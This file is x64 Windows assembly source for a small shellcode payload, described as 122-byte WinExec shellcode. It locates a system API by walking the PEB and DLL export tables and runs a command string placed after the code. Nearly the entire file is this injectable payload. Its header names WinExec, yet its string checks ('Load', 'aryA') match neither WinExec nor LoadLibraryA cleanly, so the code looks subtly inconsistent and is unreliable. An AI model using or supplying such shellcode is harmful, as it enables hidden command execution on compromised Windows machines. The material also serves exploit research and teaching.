;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;

; 122 byte WinExec shellcode for x64 windows
; odzhan

      bits   64
      
      ; SW_HIDE=0
      ; SW_SHOW=5

      push   rbx
      push   rdi
      push   rsi
      push   rbp
      sub    rsp,28h
      push   60h
      pop    rdx
      jmp    load_cmd
init_cmd:      
      mov    rax, [gs:rdx]   ; rax = (PPEB) __readgsqword(0x60);
      mov    rax, [rax+18h]  ; rax = (PPEB_LDR_DATA)peb->Ldr
      mov    rdi, [rax+10h]  ; rdi = ldr->InLoadOrderModuleList.Flink
      jmp    get_dll
next_dll:    
      mov    rdi, [rdi]      ; rdi = dte->InLoadOrderLinks.Flink
get_dll:
      mov    rbx, [rdi+30h]  ; ebx = dte->DllBase
      ; eax = IMAGE_DOS_HEADER.e_lfanew
      mov    eax, [rbx+3ch]
      add    eax, 60h
      ; ecx = IMAGE_DATA_DIRECTORY.VirtualAddress
      mov    ecx, [rbx+rax+28h]
      jecxz  next_dll
      ; esi = offset IMAGE_EXPORT_DIRECTORY.NumberOfNames 
      lea    rsi, [rbx+rcx+18h]
      lodsd
      xchg   eax, ecx
      jecxz  next_dll        ; skip if no names
      push   rdi             ; save DTE
      ; save IMAGE_EXPORT_DIRECTORY.AddressOfFunctions     
      lodsd
      add    rax, rbx        ; eax = RVA2VA(eax, ebx)
      push   rax             ; save address of functions
      ; edi = IMAGE_EXPORT_DIRECTORY.AddressOfNames
      lodsd
      add    rax, rbx        ; eax = RVA2VA(eax, ebx)
      xchg   rax, rdi        ; swap(eax, edi)
      ; save IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
      lodsd
      add    rax, rbx        ; eax = RVA(eax, ebx)
      push   rax             ; save address of name ordinals
get_name:
      mov    esi, [rdi+rcx*4-4] ; esi = RVA of API string
      cmp    dword[rsi+rbx], 'Load'
      loopne get_name           ; --ecx && Load not found
      cmp    dword[rsi+rbx+7], 'aryA'
      jne    get_name           ; LoadLibraryA not found
      pop    rdx                ; edx = AddressOfNameOrdinals
      pop    rsi                ; esi = AddressOfFunctions
      pop    rdi                ; restore DTE
      jne    next_dll           ; get next DLL    
      movzx  eax, word [rdx+rcx*2] ; eax = AddressOfNameOrdinals[eax]
      mov    ecx, dword[rsi+rax*4] ; ecx = base + AddressOfFunctions[eax]
      add    rbx, rcx
      pop    rcx
      push   1
      pop    rdx                 ; SW_SHOW
      ;cdq                       ; SW_HIDE      
      call   rbx
      add    rsp, 28h
      pop    rbp
      pop    rsi
      pop    rdi
      pop    rbx
      ret      
load_cmd:
      call   init_cmd      
      ; command goes here 
      